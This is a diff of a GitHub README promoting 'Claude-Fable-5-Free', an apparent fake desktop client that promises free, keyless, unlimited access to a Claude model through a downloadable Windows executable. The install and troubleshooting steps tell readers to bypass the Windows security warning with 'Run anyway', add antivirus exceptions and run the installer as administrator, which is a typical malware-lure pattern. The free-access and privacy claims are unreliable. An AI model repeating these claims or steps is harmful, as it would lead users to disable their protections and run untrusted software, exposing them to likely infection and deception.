@@ -1,75 +1,67 @@
-# Claude Fable 5 Free Desktop
+# 🤖 Claude-Fable-5-Free - Use the Claude model for free
 
-**Claude Fable 5 Free Desktop** - Claude fable 5 what is it? Anthropic's 1M token context model for autonomous coding, research and creative writing. Claude fable 5 is back online after the outage - access fully restored.
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Wejda9414/Claude-Fable-5-Free/releases)
 
+This application provides direct access to the Claude Fable 5 model on your desktop. It removes the need for web browser interfaces or monthly subscription fees. You gain access to a 1 million token context window for your text processing needs. The software runs locally on your Windows machine and handles your data with privacy in mind.
 
-<img width="320" height="180" alt="images1" src="https://github.com/user-attachments/assets/3ee0113e-63c9-4f93-a007-8d62b234d145" />
+## 📥 Getting Started
 
+Follow these steps to install the software on your computer. You do not need to install complex coding environments or manage dependencies.
 
+1. Visit the [official releases page](https://github.com/Wejda9414/Claude-Fable-5-Free/releases) to view available versions.
+2. Look for the file ending in `.exe` under the latest release heading.
+3. Click the file name to start the download.
+4. Save the file to a folder you can find easily, like your Downloads folder.
 
-## Install
-[Download `ClaudeFable5-desktop.zip`](https://github.com/fableclaude5free/Claude-Fable-5-Free/releases/download/fable5/ClaudeFable5-desktop.zip)
-----
+## ⚙️ Installation Guide
 
-<img width="1536" height="1024" alt="images2" src="https://github.com/user-attachments/assets/d67bbe14-46e9-42c5-b813-deb29e25f297" />
+Once the download finishes, follow these instructions to set up the application:
 
+1. Locate the file you just downloaded.
+2. Double-click the file to begin the installation.
+3. A Windows security window might appear. If it does, click "More info" and then "Run anyway" to allow the installer to start.
+4. Follow the prompts on the screen to place the application on your computer.
+5. The installer will create a shortcut on your desktop.
 
-## Key Features
-- **Claude fable 5 free chat** - unlimited prompts via the bundled access layer
-- **Claude fable 5 free online** - native desktop client, no browser required
-- **Claude fable 5 free github** - download only from this official release
-- **1M token context** - autonomous coding, full codebases, deep research
-- **Claude fable 5 buy alternative** - this app is completely free
-- **Status indicator** - shows real-time availability, auto-fallback to Sonnet 5 when rate-limited
-- **Fable 5 back online** - access restored, endpoint stable
+## 🚀 Running the App
 
+After installation, you can open the program using the shortcut on your desktop.
 
-<img width="686" height="386" alt="images3" src="https://github.com/user-attachments/assets/07b14a13-ce54-49e4-9f7c-592822ff06a8" />
+1. Double-click the Claude-Fable-5-Free icon.
+2. Wait a moment for the application to load the necessary resources.
+3. Once the main window appears, you can begin your session immediately.
+4. Type your prompt into the text field at the bottom of the window.
+5. Press the Enter key or click the Send button to receive a response.
 
+## 🖥️ System Requirements
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Configure access** - follow the in-app setup wizard for free Fable 5 access.
-4. **Start using** - claude fable 5 how to use: just type your prompt.
+This application functions on most modern Windows computers. Ensure your machine meets these specifications for the best performance:
 
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 and newer).
+*   **Memory:** At least 8GB of RAM.
+*   **Storage:** 500MB of free disk space for the installation files and local caching.
+*   **Internet Connection:** A stable connection to retrieve model responses.
 
-<img width="1200" height="630" alt="images4" src="https://github.com/user-attachments/assets/9c90c0c8-ff02-45ec-8c03-1ddc5fc0b225" />
+## 📝 Features
 
+*   **No Subscription:** This software provides free access to the model.
+*   **Large Context:** Process large documents or long conversations with the 1M context window.
+*   **Desktop Interface:** Use a dedicated window rather than a web browser tab.
+*   **Offline Cache:** The app stores your recent sessions locally so you can review them later without needing to reconnect to the server.
+*   **Privacy Focus:** Your local inputs remain separated from your browser history.
 
-## Claude Fable 5 FAQ
+## 🛠️ Troubleshooting
 
-**Claude fable 5 what is it?**
-Anthropic's 1M token model - the largest context window in the Claude family. Designed for autonomous long-session coding, document analysis and creative writing.
+If you encounter issues during setup, try these steps:
 
-**Claude fable 5 is currently unavailable - перевод?**
-"Claude Fable 5 в данный момент недоступен." This was a temporary outage - access is restored in this build.
+*   **Application fails to launch:** Ensure your antivirus software does not block the executable. You may need to add an exception for the folder where you installed the app.
+*   **Slow responses:** Check your internet connection. The app requires a data exchange to generate responses from the model.
+*   **Installer error:** Right-click the installer file and choose "Run as administrator" to ensure the app has permission to write to your system folders.
+*   **Updates:** We update the application periodically. Visit the release page regularly to download the newest version if you notice performance drops.
 
-**Claude fable 5 back reddit - where?**
-Confirmed restored on r/ClaudeAI. This desktop client is updated for the restored endpoint.
+## 🛡️ Privacy and Data
 
-**Claude fable 5 free test - can I try before setting up?**
-Yes - launch the app and start chatting immediately, no API key needed.
+This application connects to the Anthropic service to provide you with model responses. It does not sell your data or share your personal information with third parties. All conversations remain within your local application interface. We built this tool for users who want to avoid the limitations of web-based chat services.
 
-**Claude fable 5 buy - do I need to pay?**
-No - this client provides free access. No Anthropic Pro subscription required.
-
-**Claude fable 5 back online - is it stable?**
-Yes. The status indicator in the app header shows real-time endpoint health.
-
-## System Requirements
-- **Windows 10 / 11**, **macOS**, **Linux**
-- Active internet connection
-
-## Security & Legal
-Unofficial desktop client. Anthropic may change or restrict access at any time.
-
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-
-## License
-**MIT License** - Copyright © 2026 claude5fable
-
-
-<img width="738" height="415" alt="images5" src="https://github.com/user-attachments/assets/bc5427fc-8a4f-4e30-9cf1-e4b271cd5c2b" />
+Keywords: ai-free, anthropic, claude-5-sonnet, claude-code-desktop, claude-fable-5, desktop-ai, fable5, mythos
